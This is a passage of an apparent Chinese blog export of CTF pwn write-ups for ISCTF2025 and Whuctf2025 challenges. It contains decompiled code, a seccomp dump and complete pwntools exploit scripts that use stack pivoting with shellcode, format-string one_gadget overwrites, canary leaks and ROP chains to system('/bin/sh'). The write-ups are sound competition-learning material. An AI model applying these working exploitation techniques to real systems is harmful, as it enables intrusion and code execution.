__int64 __fastcall sub_13B3(int a1, __int64 a2, int i_2)&#123;  __int64 i_1; // rax  unsigned int i; // [rsp+1Ch] [rbp-4h]  for ( i = 0; ; ++i )  &#123;    i_1 = i;    if ( i == i_2 )      break;    sub_1149(a1, (int)i + a2, 1LL, 0LL, 0LL, 0LL);    i_1 = *(unsigned __int8 *)((int)i + a2);    if ( (_BYTE)i_1 == 10 )      break;  &#125;  return i_1;&#125;
unsigned __int64 sub_150A()&#123;  int v1; // [rsp+8h] [rbp-38h]  int v2; // [rsp+Ch] [rbp-34h]  int i; // [rsp+10h] [rbp-30h]  int j; // [rsp+14h] [rbp-2Ch]  _BYTE NO_SYSTEMCALL_HACK_[24]; // [rsp+20h] [rbp-20h] BYREF  unsigned __int64 v6; // [rsp+38h] [rbp-8h]  v6 = __readfsqword(0x28u);  v1 = 0;  for ( i = 0; i &lt;= 23; ++i )  &#123;    NO_SYSTEMCALL_HACK_[i] = 0;    ++v2;  &#125;  qmemcpy(NO_SYSTEMCALL_HACK_, &quot;NO SYSTEMCALL HACK!&quot;, 19);  for ( j = 0; j &lt;= 31; ++j )  &#123;    if ( *(_BYTE *)(j + 0x114514000LL) == 15 &amp;&amp; *(_BYTE *)(j + 0x114514001LL) == 5 )      ++v1;    if ( v1 &gt; 1 )    &#123;      sub_1343((__int64)NO_SYSTEMCALL_HACK_);      sub_1149(0LL, 0LL, 0LL, 0LL, 0LL, 60LL);    &#125;  &#125;  return v6 - __readfsqword(0x28u);&#125;
unsigned __int64 sub_1785()&#123;  int i; // [rsp+Ch] [rbp-34h]  __int64 (__fastcall *main_1)(__int64, char **, char **); // [rsp+10h] [rbp-30h] BYREF  __int64 v3; // [rsp+18h] [rbp-28h] BYREF  _BYTE DO_YOU_LIKE_GIFT?[24]; // [rsp+20h] [rbp-20h] BYREF  unsigned __int64 v5; // [rsp+38h] [rbp-8h]  v5 = __readfsqword(0x28u);  main_1 = main;  v3 = (__int64)&amp;v3;  for ( i = 0; i &lt;= 23; ++i )    DO_YOU_LIKE_GIFT?[i] = 0;  qmemcpy(DO_YOU_LIKE_GIFT?, &quot;DO YOU LIKE GIFT?&quot;, 17);  sub_1343((__int64)DO_YOU_LIKE_GIFT?);  sub_1343((__int64)&amp;main_1);  sub_1343((__int64)&amp;v3);  return v5 - __readfsqword(0x28u);&#125;
__int64 sub_1637()&#123;  int v1; // [rsp+0h] [rbp-130h]  int i; // [rsp+4h] [rbp-12Ch]  _BYTE RET_ADDR_ERROR[16]; // [rsp+10h] [rbp-120h] BYREF  __int64 a2[34]; // [rsp+20h] [rbp-110h] BYREF  a2[33] = __readfsqword(0x28u);  for ( i = 0; i &lt;= 15; ++i )  &#123;    RET_ADDR_ERROR[i] = 0;    ++v1;  &#125;  qmemcpy(RET_ADDR_ERROR, &quot;RET ADDR ERROR&quot;, 14);  sub_13B3(0, (__int64)a2, 4096);  return 0LL;&#125;
几个分支函数是这样的
__int64 __fastcall sub_13B3(int a1, __int64 a2, int i_2)&#123;  __int64 i_1; // rax  unsigned int i; // [rsp+1Ch] [rbp-4h]  for ( i = 0; ; ++i )  &#123;    i_1 = i;    if ( i == i_2 )      break;    sub_1149(a1, (int)i + a2, 1LL, 0LL, 0LL, 0LL);    i_1 = *(unsigned __int8 *)((int)i + a2);    if ( (_BYTE)i_1 == 10 )      break;  &#125;  return i_1;&#125;
__int64 __fastcall sub_1343(__int64 a1)&#123;  int i; // [rsp+1Ch] [rbp-4h]  for ( i = 0; *(_BYTE *)(i + a1); ++i )    ;  sub_1149(1LL, a1, i, 0LL, 0LL, 1LL);  sub_12B2();  return (unsigned int)(i + 1);&#125;
unsigned __int64 sub_12B2()&#123;  unsigned __int64 v1; // [rsp+18h] [rbp-8h]  v1 = __readfsqword(0x28u);  sub_1149();  return v1 - __readfsqword(0x28u);&#125;
可以看见整个题的核心就是sub_1149()，这个控制着syscall
.text:0000000000001149 ; __int64 sub_1149().text:0000000000001149 sub_1149        proc near               ; CODE XREF: sub_117E+3B↓p.text:0000000000001149                                         ; sub_117E+118↓p ....text:0000000000001149.text:0000000000001149 var_30          = qword ptr -30h.text:0000000000001149 var_28          = qword ptr -28h.text:0000000000001149 var_20          = qword ptr -20h.text:0000000000001149 var_18          = qword ptr -18h.text:0000000000001149 var_10          = qword ptr -10h.text:0000000000001149 var_8           = qword ptr -8.text:0000000000001149.text:0000000000001149 ; __unwind &#123;.text:0000000000001149                 endbr64.text:000000000000114D                 push    rbp.text:000000000000114E                 mov     rbp, rsp.text:0000000000001151                 mov     [rbp+var_8], rdi.text:0000000000001155                 mov     [rbp+var_10], rsi.text:0000000000001159                 mov     [rbp+var_18], rdx.text:000000000000115D                 mov     [rbp+var_20], rcx.text:0000000000001161                 mov     [rbp+var_28], r8.text:0000000000001165                 mov     [rbp+var_30], r9.text:0000000000001169                 mov     rax, r9.text:000000000000116C                 mov     r10, rcx.text:000000000000116F                 mov     r9, r8.text:0000000000001172                 xor     r9, r9.text:0000000000001175                 syscall                 ; LINUX -.text:0000000000001177                 mov     eax, 0.text:000000000000117C                 pop     rbp.text:000000000000117D                 retn.text:000000000000117D ; &#125; // starts at 1149.text:000000000000117D sub_1149        endp
逆向下来大致的意思是：
在0x114514000开了一个可读可写可执行空间，可以向里面写0x10的数据，有canary保护
然后可以在栈上写栈溢出，0x1000的长度，没有canary保护
当然我们也得到了函数基地址和栈地址
栈溢出的这一块很奇怪，控制不了返回地址，总是call exit
看了看汇编代码
.text:0000000000001703                 lea     rax, [rbp+a2].text:000000000000170A                 mov     edx, 1000h      ; i.text:000000000000170F                 mov     rsi, rax        ; a2.text:0000000000001712                 mov     edi, 0          ; a1.text:0000000000001717                 call    sub_13B3.text:000000000000171C                 movzx   eax, byte ptr [rbp+8].text:0000000000001720                 movsx   rax, al.text:0000000000001724                 cmp     [rbp+var_128], rax.text:000000000000172B                 jz      short loc_1761.text:000000000000172D                 lea     rax, [rbp+var_120].text:0000000000001734                 mov     rdi, rax.text:0000000000001737                 call    sub_1343.text:000000000000173C                 mov     r9d, 3Ch ; &#x27;&lt;&#x27;.text:0000000000001742                 mov     r8d, 0.text:0000000000001748                 mov     ecx, 0.text:000000000000174D                 mov     edx, 0.text:0000000000001752                 mov     esi, 0.text:0000000000001757                 mov     edi, 0.text:000000000000175C                 call    sub_1149.text:0000000000001761.text:0000000000001761 loc_1761:                               ; CODE XREF: sub_1637+F4↑j.text:0000000000001761                 xor     rax, rax.text:0000000000001764                 leave.text:0000000000001765                 retn.text:0000000000001765 sub_1637        endp
原来是这一块没有跳转，导致直接将rax=r9d=0x3c，call exit了
关键是这一块
.text:000000000000171C                 movzx   eax, byte ptr [rbp+8].text:0000000000001720                 movsx   rax, al.text:0000000000001724                 cmp     [rbp+var_128], rax.text:000000000000172B                 jz      short loc_1761
要使它成立才行，调试的时候发现[rbp+var_128]是0xffffffffffffff9b
关键就出在movsx rax, al，只要我们的[rbp+8]的byte符号拓展与0xffffffffffffff9b相等就行，也就是返回地址的最后一位要是0x9b
很快就找到了对于返回地址
.text:000000000000189B                 xor     rax, rax.text:000000000000189E                 leave.text:000000000000189F                 retn
那我们的思路肯定是利用栈迁移在0x114514000写上shellcode并且返回到shellcode上了
返回到main一开始的sub_13B3，向0x114514000里面写，由于我们返回前已经是控制好了的，是一个比较大的读取数，就不用返回到0x1861，直接返回到0x1866，抬高一点地址可以用push就不会写到非法内存里了，后面的就是和前面的一模一样的，控制好栈迁移就可以了
.text:000000000000184F ; __unwind &#123;.text:000000000000184F                 endbr64.text:0000000000001853                 push    rbp.text:0000000000001854                 mov     rbp, rsp.text:0000000000001857                 mov     eax, 0.text:000000000000185C                 call    sub_1429.text:0000000000001861                 mov     edx, 10h        ; i.text:0000000000001866                 mov     rax, 114514000h.text:0000000000001870                 mov     rsi, rax        ; a2.text:0000000000001873                 mov     edi, 0          ; a1.text:0000000000001878                 call    sub_13B3.text:000000000000187D                 mov     eax, 0.text:0000000000001882                 call    sub_150A.text:0000000000001887                 mov     eax, 0.text:000000000000188C                 call    sub_1785.text:0000000000001891                 mov     eax, 0.text:0000000000001896                 call    sub_1637.text:000000000000189B                 xor     rax, rax.text:000000000000189E                 leave.text:000000000000189F                 retn
一开始call execve老是不行，结果发现偷偷开了沙箱，无语了
 ~/ISCTF/ezstack  seccomp-tools dump ./pwn                                                                                          line  CODE  JT   JF      K================================= 0000: 0x20 0x00 0x00 0x00000004  A = arch 0001: 0x15 0x01 0x00 0xc000003e  if (A == ARCH_X86_64) goto 0003 0002: 0x06 0x00 0x00 0x00000000  return KILL 0003: 0x20 0x00 0x00 0x00000000  A = sys_number 0004: 0x15 0x02 0x00 0x0000003b  if (A == execve) goto 0007 0005: 0x15 0x01 0x00 0x00000142  if (A == execveat) goto 0007 0006: 0x06 0x00 0x00 0x7fff0000  return ALLOW 0007: 0x06 0x00 0x00 0x00000000  return KILL
p=start()p.recvuntil(b&quot;Welcome to ISCTF2025!\n&quot;)p.send(p64(0x114514000)+p64(0xffffffffffffff9b))p.recvuntil(b&quot;DO YOU LIKE GIFT?\n&quot;)data_addr=u64(p.recv(6).ljust(8,b&quot;\x00&quot;))elf_base=data_addr-0x184fp.recvuntil(b&quot;\n&quot;)data_addr=u64(p.recv(6).ljust(8,b&quot;\x00&quot;))stack_base=data_addrlog.success(hex(elf_base))log.success(hex(stack_base))payload=b&quot;a&quot;*0x110+p64(stack_base+0x38)+p64(elf_base+0x189b)+p64(0x114514040)+p64(elf_base+0x1866)p.sendline(payload)pause()shellcode=asm(&quot;&quot;&quot;mov rdi,0x114514040xor esi,esixor edx,edxmov eax,2syscallmov rdx, 0x200              mov edi,eaxmov rsi,0x114514400xor eax,eaxsyscallmov edi,1 mov rsi,0x114514400mov eax,edisyscall  &quot;&quot;&quot;)p.sendline(b&quot;a&quot;*0x40+b&quot;/flag\x00\x00\x00&quot;+p64(0x114514050)+shellcode.ljust(0xc0,b&quot;\x00&quot;))pause()payload2=b&quot;a&quot;*0x110+p64(stack_base+0x48)+p64(elf_base+0x189b)+p64(0x114514040)+p64(elf_base+0x189b)p.sendline(payload2)p.interactive()
heap
看起来是堆题，实际上是考非栈上格式化字符串漏洞
 ~/ISCTF/heap  checksec ./pwn                                                                                                     [*] &#x27;/home/ubuntu/ISCTF/heap/pwn&#x27;    Arch:       amd64-64-little    RELRO:      Full RELRO    Stack:      Canary found    NX:         NX enabled    PIE:        PIE enabled    SHSTK:      Enabled    IBT:        Enabled    Stripped:   No
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)&#123;  int n4; // [rsp+4h] [rbp-Ch] BYREF  unsigned __int64 v4; // [rsp+8h] [rbp-8h]  v4 = __readfsqword(0x28u);  init(argc, argv, envp);  while ( 1 )  &#123;    print_logo();    __isoc99_scanf(&quot;%d&quot;, &amp;n4);    if ( n4 == 4 )      break;    if ( n4 &lt;= 4 )    &#123;      switch ( n4 )      &#123;        case 3:          show();          break;        case 1:          add();          break;        case 2:          delete();          break;      &#125;    &#125;  &#125;  exit(0);&#125;
操作函数如下
unsigned __int64 add()&#123;  unsigned int nbytes; // [rsp+0h] [rbp-10h] BYREF  int nbytes_4; // [rsp+4h] [rbp-Ch]  unsigned __int64 v3; // [rsp+8h] [rbp-8h]  v3 = __readfsqword(0x28u);  nbytes = 0;  printf(&quot;&gt; &quot;);  __isoc99_scanf(&quot;%d&quot;, &amp;nbytes);  for ( nbytes_4 = 0; *((_QWORD *)&amp;list + nbytes_4); ++nbytes_4 )    ;  *((_QWORD *)&amp;list + nbytes_4) = malloc((int)nbytes);  if ( !*((_QWORD *)&amp;list + nbytes_4) )    exit(0);  printf(&quot;&gt; &quot;);  read(0, *((void **)&amp;list + nbytes_4), nbytes);  puts(&quot;OK!&quot;);  return v3 - __readfsqword(0x28u);&#125;
void *delete()&#123;  void *result; // rax  int num; // [rsp+Ch] [rbp-4h]  printf(&quot;&gt; &quot;);  num = read_num();  if ( !*((_QWORD *)&amp;list + num) )    exit(0);  free(*((void **)&amp;list + num));  result = &amp;list;  *((_QWORD *)&amp;list + num) = 0LL;  return result;&#125;
unsigned __int64 show()&#123;  _DWORD v1[2]; // [rsp+0h] [rbp-10h] BYREF  unsigned __int64 v2; // [rsp+8h] [rbp-8h]  v2 = __readfsqword(0x28u);  v1[0] = 0;  v1[1] = 0;  printf(&quot;&gt; &quot;);  __isoc99_scanf(&quot;%d&quot;, v1);  if ( !*((_QWORD *)&amp;list + v1[0]) )    exit(0);  printf(*((const char **)&amp;list + v1[0]));  puts(&amp;s_);  return v2 - __readfsqword(0x28u);&#125;
很明显，show就是格式化字符串漏洞，由于是写在堆上的，也是非栈上格式化字符串漏洞
而且主函数使用的是exit，不能改主函数返回地址，只能改show函数的返回地址了
“诸葛连弩”需要多次修改，这对于这道题来说实现不了，会出现只修改一次就会出现从show返回时地址错误
所以我们需要另一种方法，就是“四马分肥”
简单来说，“诸葛连弩”是使用一个三连指针攻击四次，“四马分肥”是指使用四个三连指针攻击一次
但是这道题好像没有这么多三联指针，所以只能用“诸葛连弩”创造出多个三联指针了
这个题也是要改rbp达成ogg条件的
def add(idx,size, data=b&#x27;&#x27;):    p.sendlineafter(b&#x27;&gt; &#x27;, b&#x27;1&#x27;)    p.sendlineafter(b&#x27;&gt; &#x27;, str(size))    p.sendafter(b&#x27;&gt; &#x27;, data)def delete(idx):    p.sendlineafter(b&#x27;&gt; &#x27;, b&#x27;2&#x27;)    p.sendafter(b&#x27;&gt; &#x27;, str(idx))def show(idx):    p.sendlineafter(b&#x27;&gt; &#x27;, b&#x27;3&#x27;)    p.sendlineafter(b&#x27;&gt; &#x27;, str(idx))p=start()add(0,0x100,b&quot;%33$pa%8$p&quot;)show(0)p.recvuntil(b&quot;0x&quot;)libc_base=int(p.recv(12),16)-libc.sym[&quot;__libc_start_main&quot;]-128log.success(hex(libc_base))p.recvuntil(b&quot;a0x&quot;)stack_recv=int(p.recv(12),16)log.success(hex(stack_recv))one_gadget_addr=libc_base+0xebc81one_gadget_1 = one_gadget_addr &amp; 0xffffone_gadget_2 = (one_gadget_addr &gt;&gt; 16)&amp; 0xffffone_gadget_3 = (one_gadget_addr &gt;&gt; 32)&amp; 0xffffone_gadget_4 = (one_gadget_addr &gt;&gt; 48)&amp; 0xffffone_gadget_5=(0x10000+one_gadget_2-one_gadget_1)&amp; 0xffffone_gadget_6=(0x10000+one_gadget_3-one_gadget_2)&amp; 0xffffstack_recv_1=(stack_recv+0x10)&amp;0xffffrbp=(0x10000+stack_recv_1-one_gadget_3)&amp;0xffffstack_addr_1=(stack_recv-0x18)&amp; 0xffffstack_addr_2=(stack_recv-0x18+2)&amp; 0xffffstack_addr_3=(stack_recv-0x18+4)&amp; 0xffffstack_addr_4=(stack_recv-0x18+6)&amp; 0xffff#诸葛连弩创造三联指针stack_addr_new_1=(stack_recv-0x18)&amp; 0xffffstack_addr_new_2=((stack_recv-0x18)&gt;&gt;16)&amp; 0xffffstack_addr_new_3=((stack_recv-0x18)&gt;&gt;32)&amp; 0xffffnew_addr_1=(stack_recv)&amp; 0xffffnew_addr_2=(stack_recv+2)&amp; 0xffffnew_addr_3=(stack_recv+4)&amp; 0xffffpayload_1=b&quot;%&quot; + str(new_addr_1).encode(&quot;utf-8&quot;) + b&quot;c%17$hn&quot;add(1,0x100,payload_1)show(1)payload_1=b&quot;%&quot; + str(stack_addr_new_1).encode(&quot;utf-8&quot;) + b&quot;c%47$hn&quot;add(2,0x100,payload_1)show(2)payload_2=b&quot;%&quot; + str(new_addr_2).encode(&quot;utf-8&quot;) + b&quot;c%17$hn&quot;add(3,0x100,payload_2)show(3)payload_2=b&quot;%&quot; + str(stack_addr_new_2).encode(&quot;utf-8&quot;) + b&quot;c%47$hn&quot;add(4,0x100,payload_2)show(4)payload_3=b&quot;%&quot; + str(new_addr_3).encode(&quot;utf-8&quot;) + b&quot;c%17$hn&quot;add(5,0x100,payload_3)show(5)payload_3=b&quot;%&quot; + str(stack_addr_new_3).encode(&quot;utf-8&quot;) + b&quot;c%47$hn&quot;add(6,0x100,payload_3)show(6)#pause()stack_addr_new_1=(stack_recv-0x18+4)&amp; 0xffffstack_addr_new_2=((stack_recv-0x18+4)&gt;&gt;16)&amp; 0xffffstack_addr_new_3=((stack_recv-0x18+4)&gt;&gt;32)&amp; 0xffffnew_addr_1=(stack_recv+0x110)&amp; 0xffffnew_addr_2=(stack_recv+2+0x110)&amp; 0xffffnew_addr_3=(stack_recv+4+0x110)&amp; 0xffffpayload_1=b&quot;%&quot; + str(new_addr_1).encode(&quot;utf-8&quot;) + b&quot;c%17$hn&quot;add(7,0x100,payload_1)show(7)payload_1=b&quot;%&quot; + str(stack_addr_new_1).encode(&quot;utf-8&quot;) + b&quot;c%47$hn&quot;add(8,0x100,payload_1)show(8)payload_2=b&quot;%&quot; + str(new_addr_2).encode(&quot;utf-8&quot;) + b&quot;c%17$hn&quot;add(9,0x100,payload_2)show(9)payload_2=b&quot;%&quot; + str(stack_addr_new_2).encode(&quot;utf-8&quot;) + b&quot;c%47$hn&quot;add(10,0x100,payload_2)show(10)payload_3=b&quot;%&quot; + str(new_addr_3).encode(&quot;utf-8&quot;) + b&quot;c%17$hn&quot;add(11,0x100,payload_3)show(11)payload_3=b&quot;%&quot; + str(stack_addr_new_3).encode(&quot;utf-8&quot;) + b&quot;c%47$hn&quot;add(12,0x100,payload_3)show(12)stack_addr_new_1=(stack_recv-0x20)&amp; 0xffffstack_addr_new_2=((stack_recv-0x20)&gt;&gt;16)&amp; 0xffffstack_addr_new_3=((stack_recv-0x20)&gt;&gt;32)&amp; 0xffffnew_addr_1=(stack_recv+0x100)&amp; 0xffffnew_addr_2=(stack_recv+2+0x100)&amp; 0xffffnew_addr_3=(stack_recv+4+0x100)&amp; 0xffffpayload_1=b&quot;%&quot; + str(new_addr_1).encode(&quot;utf-8&quot;) + b&quot;c%17$hn&quot;add(13,0x100,payload_1)show(13)payload_1=b&quot;%&quot; + str(stack_addr_new_1).encode(&quot;utf-8&quot;) + b&quot;c%47$hn&quot;add(14,0x100,payload_1)show(14)payload_2=b&quot;%&quot; + str(new_addr_2).encode(&quot;utf-8&quot;) + b&quot;c%17$hn&quot;add(15,0x100,payload_2)show(15)payload_2=b&quot;%&quot; + str(stack_addr_new_2).encode(&quot;utf-8&quot;) + b&quot;c%47$hn&quot;add(16,0x100,payload_2)show(16)payload_3=b&quot;%&quot; + str(new_addr_3).encode(&quot;utf-8&quot;) + b&quot;c%17$hn&quot;add(17,0x100,payload_3)show(17)payload_3=b&quot;%&quot; + str(stack_addr_new_3).encode(&quot;utf-8&quot;) + b&quot;c%47$hn&quot;add(18,0x100,payload_3)show(18)# 四马分肥payload1=b&quot;%&quot; + str(stack_addr_2).encode(&quot;utf-8&quot;) + b&quot;c%20$hn&quot;payload2=b&quot;%&quot; + str(one_gadget_1).encode(&quot;utf-8&quot;) + b&quot;c%12$hn&quot;payload2+=b&quot;%&quot; + str(one_gadget_5).encode(&quot;utf-8&quot;) + b&quot;c%47$hn&quot;payload2+=b&quot;%&quot; + str(one_gadget_6).encode(&quot;utf-8&quot;) + b&quot;c%46$hn&quot;payload2+=b&quot;%&quot; + str(rbp).encode(&quot;utf-8&quot;) + b&quot;c%44$hn&quot;add(19,0x100,payload1)add(20,0x100,payload2)show(19)show(20)p.interactive()
ez_canary
保护如下
 ~/ISCTF/ez_canary  checksec ./pwn                                                                                                 [*] &#x27;/home/ubuntu/ISCTF/ez_canary/pwn&#x27;    Arch:       amd64-64-little    RELRO:      Partial RELRO    Stack:      Canary found    NX:         NX enabled    PIE:        No PIE (0x400000)    SHSTK:      Enabled    IBT:        Enabled    Stripped:   No
函数如下
int __fastcall main(int argc, const char **argv, const char **envp)&#123;  pthread_t newthread[2]; // [rsp+0h] [rbp-10h] BYREF  newthread[1] = __readfsqword(0x28u);  init(argc, argv, envp);  puts(&quot;Welcome to Kris&#x27;s program!&quot;);  pthread_create(newthread, 0LL, vuln, 0LL);  pthread_join(newthread[0], 0LL);  return 0;&#125;
void *__fastcall vuln(void *a1)&#123;  _QWORD buf[6]; // [rsp+10h] [rbp-150h] BYREF  __int16 v3; // [rsp+40h] [rbp-120h]  _QWORD buf_1[34]; // [rsp+50h] [rbp-110h] BYREF  buf_1[33] = __readfsqword(0x28u);  memset(buf, 0, sizeof(buf));  v3 = 0;  memset(buf_1, 0, 256);  puts(&quot;Please enter your name &gt;&gt;&quot;);  read(0, buf, 0x1000uLL);  printf(&quot;Your name: %s&quot;, (const char *)buf);  puts(&quot;Please enter your content &gt;&gt;&quot;);  read(0, buf_1, 0x1000uLL);  printf(&quot;Your content: %s&quot;, (const char *)buf_1);  return 0LL;&#125;
一样是先覆盖canary低字节泄露canary
然后栈迁移到bss段上，返回vuln函数，让buf的地址刚好是stderr，再覆盖低一字节，泄露出libc地址
.bss:0000000000404080                 public stderr@GLIBC_2_2_5.bss:0000000000404080 ; FILE *stderr.bss:0000000000404080 stderr@GLIBC_2_2_5 dq ?                 ; DATA XREF: LOAD:0000000000400500↑o.bss:0000000000404080                                         ; init+30↑r.bss:0000000000404080                                         ; Alternative name is &#x27;stderr&#x27;.bss:0000000000404080                                         ; Copy of shared data
得到libc地址后，准备再次栈迁移，抬高栈地址给system函数
设置好偏移和rop链就可以了
p=start()bss_addr=0x404080p.recvuntil(b&quot;Please enter your name &gt;&gt;\n&quot;)p.send(b&#x27;a&#x27;*0x149)p.recvuntil(b&quot;a&quot;*0x149)canary=u64(b&quot;\x00&quot;+p.recv(7))log.success(hex(canary))payload1=b&quot;a&quot;*0x108+p64(canary)+p64(bss_addr+0x150)+p64(0x4013E3)p.recvuntil(b&quot;Please enter your content &gt;&gt;\n&quot;)p.send(payload1)p.recvuntil(b&quot;Please enter your name &gt;&gt;\n&quot;)p.send(b&#x27;\xa0&#x27;)p.recvuntil(b&quot;\xa0&quot;)libc_base=u64(b&quot;\xa0&quot;+p.recv(5).ljust(7,b&quot;\x00&quot;))-libc.sym[&quot;_IO_2_1_stderr_&quot;]log.success(hex(libc_base))p.recvuntil(b&quot;Please enter your content &gt;&gt;\n&quot;)system_addr = libc_base + libc.sym[&quot;system&quot;]binsh_addr = libc_base + next(libc.search(b&quot;/bin/sh&quot;))payload2=b&quot;a&quot;*0x108+p64(canary)+p64(bss_addr+0x840)+p64(0x401492)payload2=payload2.ljust(0x6f0,b&quot;\x00&quot;)payload2+=p64(bss_addr+0x750)+p64(libc_base+0x2a3e5)+p64(binsh_addr)+p64(0x401493)+p64(system_addr)payload2=payload2.ljust(0x7f8,b&quot;\x00&quot;)payload2+=p64(canary)+p64(bss_addr+0x800-0x110+0x40)+p64(0x401492)#pause()p.send(payload2)p.interactive()
]]></content>
      <categories>
        <category>Competiton</category>
      </categories>
      <tags>
        <tag>CTF</tag>
      </tags>
  </entry>
  <entry>
    <title>Whuctf2025</title>
    <url>/2025/10/27/Whuctf2025/</url>
    <content><![CDATA[Whuctf2025
ncc
nc + cat flag
eznote
int add()&#123;  int heapindex; // ebx  char nptr[8]; // [rsp+0h] [rbp-120h] BYREF  char s[8]; // [rsp+8h] [rbp-118h] BYREF  char src[264]; // [rsp+10h] [rbp-110h] BYREF  puts(&quot;add note function called&quot;);  puts(&quot;input your note index (0-9): &quot;);  fgets(s, 8, stdin);  heapindex = atoi(s);  if ( (unsigned int)heapindex &gt;= 0xA )    return puts(&quot;invalid index!&quot;);  if ( *((_QWORD *)&amp;notes + heapindex) )    return puts(&quot;note already exists!&quot;);  puts(&quot;input your note size: &quot;);  fgets(nptr, 8, stdin);  size = atoi(nptr);  if ( size &lt;= 0 || size &gt; 1024 )    return puts(&quot;invalid size!&quot;);  heapindex = heapindex;  *((_QWORD *)&amp;notes + heapindex) = malloc(size);  if ( !*((_QWORD *)&amp;notes + heapindex) )    return puts(&quot;memory allocation failed!&quot;);  puts(&quot;input your note content: &quot;);  fgets(src, size, stdin);  strncpy(*((char **)&amp;notes + heapindex), src, size);  return puts(&quot;note added successfully!&quot;);&#125;
src在栈上，size的fgets获得溢出长度，利用content的fgets可以覆盖返回地址并写ROP链，只需要获得libc地址就可以了
int view()&#123;  char s[8]; // [rsp+4h] [rbp-Ch] BYREF  int n9; // [rsp+Ch] [rbp-4h]  puts(&quot;view note function called&quot;);  puts(&quot;input your note index (0-9): &quot;);  fgets(s, 8, stdin);  n9 = atoi(s);  if ( n9 &lt;= 9 &amp;&amp; *((_QWORD *)&amp;notes + n9) )    return printf(&quot;note content: %p\n&quot;, *((const void **)&amp;notes + n9));  else    return puts(&quot;invalid index or note does not exist!&quot;);&#125;
打印的是notes数组的内容，数组的内容存放着堆地址，notes存在bss段，关键是没限制n9是正数，可以访问notes地址前面的地址的内容
.bss:0000000000004040                                   public stderr@GLIBC_2_2_5.bss:0000000000004040                   ; FILE *stderr.bss:0000000000004040 ?? ?? ?? ?? ?? ?? stderr@GLIBC_2_2_5 dq ?                 ; DATA XREF: LOAD:0000000000000598↑o.bss:0000000000004040 ?? ??                                                     ; initialize+30↑r.bss:0000000000004040                                                           ; Alternative name is &#x27;stderr&#x27;.bss:0000000000004040                                                           ; Copy of shared data.bss:0000000000004048 ??                completed_0     db ?                    ; DATA XREF: __do_global_dtors_aux+4↑r.bss:0000000000004048                                                           ; __do_global_dtors_aux+2C↑w.bss:0000000000004049 ?? ?? ?? ?? ?? ??…                align 20h.bss:0000000000004060                                   public note_count.bss:0000000000004060 ??                note_count      db    ? ;.bss:0000000000004061 ??                                db    ? ;.bss:0000000000004062 ??                                db    ? ;.bss:0000000000004063 ??                                db    ? ;.bss:0000000000004064                                   public size.bss:0000000000004064                   ; int size.bss:0000000000004064 ?? ?? ?? ??       size            dd ?                    ; DATA XREF: add+F4↑w.bss:0000000000004064                                                           ; add+FA↑r ....bss:0000000000004068                                   public heapindex.bss:0000000000004068 ?? ?? ?? ??       heapindex       dd ?                    ; DATA XREF: add+58↑w.bss:0000000000004068                                                           ; add+5E↑r ....bss:000000000000406C ?? ?? ?? ?? ?? ??…                align 20h.bss:0000000000004080                                   public notes.bss:0000000000004080 ??                notes           db    ? ;               ; DATA XREF: add+97↑o.bss:0000000000004080                                                           ; add+149↑o ...
输入特定负数可以访问0x4040，把_IO_2_1_stderr__地址给输出出来，就可以得到libc基址了，接下来构造ROP链就可以了
p=start()p.recvuntil(b&quot;your choice:&quot;)p.sendline(str(4))p.recvuntil(b&quot;input your note index (0-9): \n&quot;)p.sendline(str(-8))p.recvuntil(b&quot;note content: &quot;)addr_str = p.recvline().strip()libc_base = int(addr_str, 16)-libc.sym[&quot;_IO_2_1_stderr_&quot;]log.success(hex(libc_base))system_addr = libc_base + libc.sym[&quot;system&quot;]binsh_addr = libc_base + next(libc.search(b&quot;/bin/sh&quot;))pop_rdi_addr=libc_base+0x10f78bp.recvuntil(b&quot;your choice:&quot;)p.sendline(str(1))p.recvuntil(b&quot;input your note index (0-9): \n&quot;)p.sendline(str(2))p.recvuntil(b&quot;input your note size: \n&quot;)p.sendline(str(0x200))p.recvuntil(b&quot;input your note content: \n&quot;)p.sendline(b&quot;a&quot;*0x118+p64(pop_rdi_addr+1)+p64(pop_rdi_addr)+p64(binsh_addr)+p64(system_addr))p.interactive()#flag&#123;e6795c60-1bd0-4639-841b-78e8fa57adb4&#125;
magic
__int64 vuln()&#123;  _BYTE ptr[1280]; // [rsp+0h] [rbp-500h] BYREF  puts(&quot;Let me show you a magic trick.&quot;);  puts(&quot;Do you like stack overflow?&quot;);  fread(ptr, 1uLL, 0x50FuLL, stdin);  puts(&quot;What&#x27;s your favorite number?&quot;);  magic_number = get_input_num();  puts(&quot;And now... for the magic moment!&quot;);  magic(ptr, 0LL, 0LL);  return (unsigned int)magic_number;&#125;
调试发现，在fread输入的第一个八字节会在返回是作为rdi参数，magic_number作为rax参数
.text:0000000000401280 BA 0F 05 00 00                    mov     edx, 50Fh       ; n
关键是这个50Fh很诡异，查询发现0F 05机器码代表的是syscall
控制返回地址到0x401281，magic_number为0x3b，fread的第一个8字节写入/bin/sh
p=start()p.recvuntil(b&quot;Do you like stack overflow?\n&quot;)payload=b&quot;/bin/sh\x00&quot;+b&quot;a&quot;*0x4f8+p64(0x404518)+b&quot;\x81\x12\x40\x00\x00\x00\x00&quot; p.send(payload)p.recvuntil(b&quot;What&#x27;s your favorite number?\n&quot;)p.sendline(str(59))p.recvuntil(b&quot;And now... for the magic moment!\n&quot;)p.interactive()#flag&#123;245d131f-daf0-403a-89bc-264aeaaa489c&#125;
ezshell
int __fastcall __noreturn main(int argc, const char **argv, const char **envp)&#123;  char *s2_1; // rbx  char *v4; // rax  char n41; // dl  __int64 i; // rax  char *v7; // rax  __int64 n255; // r14  size_t n_1; // r14  char n45; // dl  __int64 n6; // rax  char n47; // dl  __int64 j; // rax  char n41_1; // dl  __int64 k; // rax  char n53; // dl  __int64 m; // rax  const char *s2_3; // rsi  const char **v19; // rbx  __int64 n; // rax  int v21; // r14d  FILE *stream; // r14  int v23; // r14d  __pid_t v24; // eax  int v25; // eax  int v26; // r9d  char *s_2; // rdi  unsigned int seed; // eax  int v29; // eax  __int64 n60; // rcx  int *v31; // rdi  size_t n0xF; // rax  __int64 ii; // rax  __int64 n255_1; // r14  int v35; // [rsp+8h] [rbp-850h]  char *s2_2; // [rsp+30h] [rbp-828h]  _QWORD v37[7]; // [rsp+58h] [rbp-800h] BYREF  int n6584176; // [rsp+90h] [rbp-7C8h] BYREF  char ls[8]; // [rsp+98h] [rbp-7C0h] BYREF  char s2[16]; // [rsp+A0h] [rbp-7B8h] BYREF  char s1[32]; // [rsp+B0h] [rbp-7A8h] BYREF  char s1_1[32]; // [rsp+D0h] [rbp-788h] BYREF  char v43[32]; // [rsp+F0h] [rbp-768h] BYREF  